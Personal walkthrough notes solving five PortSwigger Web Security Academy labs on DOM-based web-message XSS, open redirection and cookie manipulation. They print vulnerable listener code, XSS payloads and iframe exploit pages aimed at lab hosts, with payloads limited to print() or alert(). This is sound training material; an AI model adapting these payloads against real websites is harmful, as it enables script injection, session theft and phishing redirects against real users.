---
created: 2026-07-12
---

| `#`  | Solved? | Name                                            | Date    |
| ---- | ------- | ----------------------------------------------- | ------- |
| `1.` | `✓`     | DOM XSS using web messages                      | `12.07` |
| `2.` | `✓`     | DOM XSS using web messages and a JavaScript URL | `12.07` |
| `3.` | `✓`     | DOM XSS using web messages and `JSON.parse`     | `12.07` |
| `4.` | `✓`     | DOM-based open redirection                      | `12.07` |
| `5.` | `✓`     | DOM-based cookie manipulation                   | `12.07` |


## 1. DOM XSS using web messages

>[!done]

>[!note]+ Lab description
> - [`Lab: DOM XSS using web messages`](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)
> - Level: #Practitioner 
> 
> This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the `print()` function to be called.

### Solution

- Ensure `Postmessage interception is on` in DOM Invader. 

- Inspect the source of the lab home page and find a `message` event listener:

```html
<script>
	window.addEventListener('message', function(e) {
		document.getElementById('ads').innerHTML = e.data;
	})
</script>
```

![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab1/1.png]]

- The code listens for incoming `message` events and replaces `innerHTML` of an element with the ID `ads` with the message data.
- Browse the application with `DOM Invader`. In `DevTools` -> `DOM Invader` -> `Messages` see some messages DOM Invader sent are reflected on the page:

![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab1/2.png]]

- Inspect the source:

![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab1/3.png]]

- To get JavaScript execution, you'd send a message like this:

```html
<img src=x onerror=print()>
```

>[!note] `<script>print()</script>` won't work in `innerHTML` sink.

![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab1/4.png]]

- Replay the message with that content in DOM Invader.
- See a print popup:

![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab1/5.png]]

- To send the message, host the following on your exploit server:

```html
<iframe src="https://0af900ba03ccbf2a81d843f400d80091.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=x onerror=print()>','*')">
```

![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab1/6.png]]

- `Store` and `View exploit`. You should see that print popup again.
- `Deliver exploit to victim`.

![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab1/solved.png]]

Solved!

## 2. DOM XSS using web messages and a JavaScript URL

>[!done]

>[!note]+ Lab description
> - [`Lab: DOM XSS using web messages and a JavaScript URL`](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)
> - Level: #Practitioner 
> 
> This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the `print()` function.

### Solution

- Inspect the source of the lab home page. See a `message` event listener:

```html
<script>
	window.addEventListener('message', function(e) {
		var url = e.data;
		if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
			location.href = url;
		}
	}, false);
</script>
```

- This code sets up a listener for the `message` event and stores the data sent with the message in `e.data` (event `data` property).
- Then the code checks if the URL contains `'http:'` or `'https:` using `indexOf()`. If yes, the code DOM-redirects the browser to that location.

![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab2/1.png]]

- To cause the browser execute `print()`, you could use a `javascript:` URL:

```js
javascript:print()
```

- But for the redirect to work, the message should contain `http:` or `https:` (though nothing says the message should start with it). You can add the necessary patter suing a comment:

```js
javascript:print()//http:
```

- Check if it works using this exploit:

```html
<iframe src="https://0aca00fb0359e45b80ad1cc90023007b.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab2/2.png]]

- `Store` and `View exploit`.
- You should see a print popup:

![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab2/3.png]]

- `Deliver exploit to victim`.

![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab2/solved.png]]

Solved!

## 3. DOM XSS using web messages and `JSON.parse`

>[!done]

>[!note]+ Lab description
> - [`Lab: DOM XSS using web messages and JSON.parse`](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)
> - Level: #Practitioner 
> This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the `print()` function.


### Solution

- Inspect the source of the lab home page.

```html
<script>
	window.addEventListener('message', function(e) {
		var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
		document.body.appendChild(iframe);
		try {
			d = JSON.parse(e.data);
		} catch(e) {
			return;
		}
		switch(d.type) {
			case "page-load":
				ACMEplayer.element.scrollIntoView();
				break;
			case "load-channel":
				ACMEplayer.element.src = d.url;
				break;
			case "player-height-changed":
				ACMEplayer.element.style.width = d.width + "px";
				ACMEplayer.element.style.height = d.height + "px";
				break;
		}
	}, false);
</script>
```

- This code listens for `message` events. As soon as a message arrives, it creates a new `<iframe>` element, creates an object `ACMEplayer` with a property `element` pointing to the `<iframe>`, and declares a variable `d` for later use.
- The `<iframe>` is then added to the page's body.
- Then the function tries to parse the message data as JSON and store in the `d` variable (`d = JSON.parse(e.data);`). If parsing fails, the function exits early.
- The code switches based on `d.type`:
	- `page-load`: Calls `scrollIntoView()` on the `<iframe>` to bring it into view.
	- `load-channel`: Sets the `<iframe>`'s `src` attribute to `d.url`, loading new content.
	- `player-height-changed`: Adjusts the `<iframe>`'s width and height to `d.width` and `d.height` pixels.

![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab3/1.png]]

- To get code execution, you need `load-channel` with `javascript:print()` URL.
- Intercept web messages using DOM Invader:

![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab3/2.png]]


- Modify the message and replay it:

```json
{"type": "load-channel","url": "javascript:print()"}
```

![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab3/3.png]]

- You should see a print popup:

![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab3/4.png]]

- Go to your exploit server and prepare the exploit (backslash-escape double quotes):

```
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>

```

```html
<iframe src="https://0abf00110459320080812b4100f900e1.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab3/5.png]]

- `Store` and `View exploit`. You should see the print popup again.
- Then `Deliver exploit to victim`.

![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab3/solved.png]]

Solved!
## 4. DOM-based open redirection

>[!done]


>[!note]+ Lab description
> - [`Lab: DOM-based open redirection`](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)
> - Level: #Practitioner 
> 
> This lab contains a DOM-based open-redirection vulnerability. To solve this lab, exploit this vulnerability and redirect the victim to the exploit server.

### Solution

- Inspect the source of a blog post page. The `Back to Blog` link looks like this:

```html
<div class="is-linkback">
	<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
</div>
```

- `returnUrl = /url=(https?:\/\/.+)/.exec(location);` uses a regular expression to search the current URL (`location`) for `url=` followed by a space, then an `http://` or `https://` URL. `(https?:\/\/.+)` is a capturing group for the URL.
- `.exec(location)` executes the regex on the current URL string and returns an array if a match is found, or `null` if no match.

![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab4/1.png]]

- So, to redirect a victim to your exploit server, you need something like:

```powershell
url=https://exploit-0a5600be04d9edf58052a7e9016c0069.exploit-server.net/
```

- Construct a URL:

```powershell
https://0a4c00c8044ded2e80a3a80500450075.web-security-academy.net/post?postId=1&url=https://exploit%2D0a5600be04d9edf58052a7e9016c0069%2Eexploit%2Dserver%2Enet/
```

- Follow that link. The lab gets solved. To check the exploit, click `Back to Blog` and see you are redirected to your exploit server.

![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab4/solved.png]]

Solved!
## 5. DOM-based cookie manipulation

>[!done]

>[!note]+ Lab description
> - [`Lab: DOM-based cookie manipulation`](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)
> - Level: #Practitioner 
> 
> This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call the `print()` function. You will need to use the exploit server to direct the victim to the correct pages.
### Solution

- Navigate the lab, visit any product. See JavaScript code that assigns the `lastViewedProduct` cookie to the current URL:

```html
<script>
	document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```

![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab5/1.png]]

- In HTTP history, see that you now indeed have the `lastViewedProduct` cookie set:

![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab5/2.png]]

- Notice the `Last viewed product` has the same link as in the `LastViewedProduct`.
- Send the above request to `Repeater` and modify the URL in the cookie to see it it's reflected in the DOM:

![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab5/3.png]]

- The link from the cookie is reflected in the DOM. Try to escape the current context and inject `<script>alert()</script>`:

```bash
'><script>alert()</script>
```


![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab5/4.png]]

- The injection is interpreted as part of the original HTML, so the execution should work. 
- To test it, you need to visit the URL you now injected into the cookie twice, with `'><script>alert()</script>` URL-encoded as `'%3E%3Cscript%3Ealert()%3C/script%3E`. 
- The first visit assigns the `lastViwedProduct` cookie, and the second visit sends a request with that cookie set. It gets reflected in the response and triggers the execution. So, on the second visit, you should see an alert popup:

![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab5/5.png]]

- To reproduce this in an exploit, you can use something like this (the lab needs you to execute `print()` rather than `alert()` so change the code inside the `<script>` tag accordingly):

```html
<iframe 
	src="https://0ae50068043837398392be8700550000.web-security-academy.net/product?productId=1&'><script>print()</script>" 
	onload="if(!window.x)this.src='https://0ae50068043837398392be8700550000.web-security-academy.net';window.x=1;">
```

- This loads an `<iframe>` with the source of a product URL + JavaScript injection you just tested.
- As soon as the `<iframe>` loads, JavaScript in the `onload` handler checks: 
	- If the `x` property of the `window` object **is not set** (`if(!window.x)`) then change the source of the current `<iframe>` to the lab home (`window.x` not set? -> redirect to lab home). 
	- After that, set the `window.x` property to `1` (`window.x` is just a dummy checker property; it can be anything, like `window.dummy`). This marks that the first visit that sets the cookie has already occurred.
- On the second visit, `window.x` is already set, so the exploit triggers and nothing should be done.

![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab5/6.png]]

- `Store` and `View exploit`. You should see a print popup. On the next visit of a lab page, `print()` should trigger again.
- Then `Deliver exploit to victim`. 

![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab5/solved.png]]

Solved!
